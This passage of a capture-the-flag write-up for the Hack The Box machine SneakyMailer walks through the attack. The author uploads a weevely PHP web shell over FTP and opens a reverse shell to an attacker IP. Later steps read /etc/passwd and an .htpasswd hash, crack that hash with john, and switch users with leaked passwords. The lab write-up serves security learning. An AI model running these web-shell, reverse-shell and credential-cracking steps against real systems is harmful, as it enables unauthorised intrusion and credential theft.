completed.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s try those creds: <code>developer</code> / <code>m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</code> and then mess with pypi modules.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="ftp-access">FTP access<a href="#ftp-access" class="hash-link" aria-label="Direct link to FTP access" title="Direct link to FTP access">​</a></h2><p>The credentials are working on the FTP server:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ftp sneakycorp.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connected to sneakycorp.htb.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">220 (vsFTPd 3.0.3)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Name (sneakycorp.htb:cyfun): developer</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">331 Please specify the password.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">230 Login successful.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Remote system type is UNIX.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Using binary mode to transfer files.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ftp&gt; ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">200 PORT command successful. Consider using PASV.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">150 Here comes the directory listing.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxrwxr-x    8 0        1001         4096 Nov 08 15:39 dev</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">226 Directory send OK.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ftp&gt; ls dev</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">200 PORT command successful. Consider using PASV.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">150 Here comes the directory listing.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    2 0        0            4096 May 26 18:52 css</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    2 0        0            4096 May 26 18:52 img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x    1 0        0           13742 Jun 23 08:44 index.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    3 0        0            4096 May 26 18:52 js</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    2 0        0            4096 May 26 18:52 pypi</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    4 0        0            4096 May 26 18:52 scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x    1 0        0           26523 May 26 19:58 team.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    8 0        0            4096 May 26 18:52 vendor</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">226 Directory send OK.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Before uploadign a PHP web shell, let&#x27;s craft one:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ weevely generate cyfun agent.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Generated &#x27;agent.php&#x27; with password &#x27;cyfun&#x27; of 744 byte size.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then let&#x27;s uplaod it:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ftp&gt; cd dev</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">250 Directory successfully changed.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ftp&gt; put agent.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">200 PORT command successful. Consider using PASV.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">150 Ok to send data.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">226 Transfer complete.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">744 bytes sent in 6.3e-05 seconds (11.3 Mbytes/s)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then let&#x27;s connect to our webshell and use the <code>backdoor_reversetcp</code> module
to get a reverse shell because the webshell is quickly removed from the server:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ weevely http://dev.sneakycorp.htb/agent.php cyfun</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] weevely 4.0.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Target:     www-data@sneakymailer:/var/www/dev.sneakycorp.htb/dev</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Session:    /home/cyfun/.weevely/sessions/dev.sneakycorp.htb/agent_0.session</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Shell:      System shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Browse the filesystem or execute commands starts the connection</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] to the target. Type :help for more information.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">weevely&gt; :backdoor_reversetcp 10.10.14.174 8080</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Reverse shell connected, insert commands. Append semi-colon help to get the commands accepted.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ id;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--from-www-data-to-developer">Privilege Escalation of Machine : from www-data to developer<a href="#privilege-escalation-of-machine--from-www-data-to-developer" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : from www-data to developer" title="Direct link to Privilege Escalation of Machine : from www-data to developer">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /etc/passwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root:x:0:0:root:/root:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sync:x:4:65534:sync:/bin:/bin/sync</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">low:x:1000:1000:,,,:/home/low:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ftp:x:107:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">postfix:x:108:116::/var/spool/postfix:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">courier:x:109:118::/var/lib/courier:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">vmail:x:5000:5000::/home/vmail:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">developer:x:1001:1001:,,,:/var/www/dev.sneakycorp.htb:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pypi:x:998:998::/var/www/pypi.sneakycorp.htb:/usr/sbin/nologin</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>There are 2 users excluding roto that have a shell: low &amp; developer.</p><p>Let&#x27;s try the dev creds:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ su developer</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=1001(developer) gid=1001(developer) groups=1001(developer)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But the home directory of developer is <code>/var/www/dev.sneakycorp.htb</code>
the flag is not here.</p><p>We may look elsewhere.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--from-developer-to-low">Privilege Escalation of Machine : from developer to low<a href="#privilege-escalation-of-machine--from-developer-to-low" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : from developer to low" title="Direct link to Privilege Escalation of Machine : from developer to low">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ls -lh /home</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 8.0K</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 8 low   low   4.0K Jun  8 03:47 low</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwx------ 5 vmail vmail 4.0K May 19 21:10 vmail</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ls -lhA /home/low</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 40K</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lrwxrwxrwx 1 root root    9 May 19 21:09 .bash_history -&gt; /dev/null</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r-- 1 low  low   220 May 14 05:46 .bash_logout</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r-- 1 low  low  3.5K May 14 05:46 .bashrc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 3 low  low  4.0K May 16 03:34 .cache</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwx------ 3 low  low  4.0K May 14 13:21 .gnupg</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 3 low  low  4.0K May 16 03:37 .local</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dr-x------ 2 low  low  4.0K May 16 03:30 .pip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r-- 1 low  low   807 May 14 05:46 .profile</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 2 low  low  4.0K Jun  8 03:47 .ssh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-x--- 1 root low    33 Nov  9 10:36 user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 6 low  low  4.0K May 16 03:33 venv</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We already saw 2 references to pypi, now there is a venv folder own by low
and in <code>/etc/passwd</code> an account named pypi which has a home folder named
<code>/var/www/pypi.sneakycorp.htb</code>.</p><p>It seems the pe will go through venv/pypi.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ls -lhA /var/www/pypi.sneakycorp.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 12K</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r-- 1 root root       43 May 15 14:29 .htpasswd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxrwx--- 2 root pypi-pkg 4.0K Nov  9 12:19 packages</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 6 root pypi     4.0K May 14 18:25 venv</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can check the hash:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat /var/www/pypi.sneakycorp.htb/.htpasswd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s see the kind of hash:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ haiti &#x27;$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">MD5(APR) [HC: 1600]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Apache MD5 [HC: 1600]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ john hash.txt --wordlist=/usr/share/wordlists/passwords/rockyou.txt --format=md5crypt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Using default input encoding: UTF-8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Will run 4 OpenMP threads</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">soufianeelhaoui  (pypi)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1g 0:00:00:27 DONE (2020-11-09 21:36) 0.03652g/s 130543p/s 130543c/s 130543C/s souhegan..souderton0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Session complete</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s add the new sub-domain to <code>/etc/hosts</code>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /etc/hosts | grep sneak</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.10.197 sneakycorp.htb dev.sneakycorp.htb pypi.sneakycorp.htb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>On port 80 we have the same website as for sneakycorp.htb but on port 8080
we can see an app called pypiserver. (<a href="http://pypi.sneakycorp.htb:8080/" target="_blank" rel="noopener noreferrer">http://pypi.sneakycorp.htb:8080/</a>)</p><blockquote><p> Welcome to pypiserver!</p><p>This is a PyPI compatible package index serving 0 packages.</p><p>To use this server with pip, run the following command:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">    pip install --index-url http://pypi.sneakycorp.htb/simple/ PACKAGE [PACKAGE2...]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" 